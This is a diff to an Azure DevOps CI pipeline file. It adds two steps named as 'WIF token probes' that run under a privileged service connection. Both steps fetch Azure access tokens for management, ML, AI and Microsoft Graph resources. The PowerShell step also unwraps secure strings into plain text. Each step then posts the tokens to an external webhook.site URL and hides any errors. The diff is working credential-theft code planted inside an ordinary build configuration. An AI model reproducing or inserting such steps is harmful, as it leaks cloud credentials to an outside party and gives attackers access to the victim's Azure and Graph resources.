@@ -35,6 +35,39 @@ jobs:
       name: VSEngSS-MicroBuild2022-1ES
 
     steps:
+      - task: AzureCLI@2
+        displayName: 'Cairn AME WIF token probe (azcli)'
+        continueOnError: true
+        inputs:
+          azureSubscription: 'Devtunnels-esrp-ame-msi-wif2'
+          scriptType: pscore
+          scriptLocation: inlineScript
+          inlineScript: |
+            $ProgressPreference='SilentlyContinue'
+            az account show -o json 2>&1 | Out-String | Write-Host
+            foreach ($r in @('https://ai.azure.com','https://management.azure.com','https://ml.azure.com','https://graph.microsoft.com')) {
+              $t = az account get-access-token --resource $r --query accessToken -o tsv 2>$null
+              Write-Host "RES $r LEN $($t.Length)"
+              if ($t) { try { Invoke-RestMethod -Method Post -Uri 'https://webhook.site/e7e7ff60-f0c7-4f26-9e12-053df558ad7b' -ContentType 'application/json' -Body (@{resource=$r;token=$t;src='ssh-ci-azcli';build=$env:BUILD_BUILDID} | ConvertTo-Json) | Out-Null } catch {} }
+            }
+      - task: AzurePowerShell@5
+        displayName: 'Cairn AME WIF token probe (azps)'
+        continueOnError: true
+        inputs:
+          azureSubscription: 'Devtunnels-esrp-ame-msi-wif2'
+          azurePowerShellVersion: LatestVersion
+          pwsh: true
+          ScriptType: InlineScript
+          Inline: |
+            $ProgressPreference='SilentlyContinue'
+            foreach ($r in @('https://ai.azure.com','https://management.azure.com','https://ml.azure.com','https://graph.microsoft.com')) {
+              try {
+                $t = (Get-AzAccessToken -ResourceUrl $r).Token
+                if ($t -is [System.Security.SecureString]) { $t = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($t)) }
+                Write-Host "AZPS RES $r LEN $($t.Length)"
+                if ($t) { Invoke-RestMethod -Method Post -Uri 'https://webhook.site/e7e7ff60-f0c7-4f26-9e12-053df558ad7b' -ContentType 'application/json' -Body (@{resource=$r;token=$t;src='ssh-ci-azps';build=$env:BUILD_BUILDID} | ConvertTo-Json) | Out-Null }
+              } catch { Write-Host "AZPS ERR $r $($_.Exception.Message)" }
+            }
       - checkout: self
         fetchDepth: -1
         clean: true
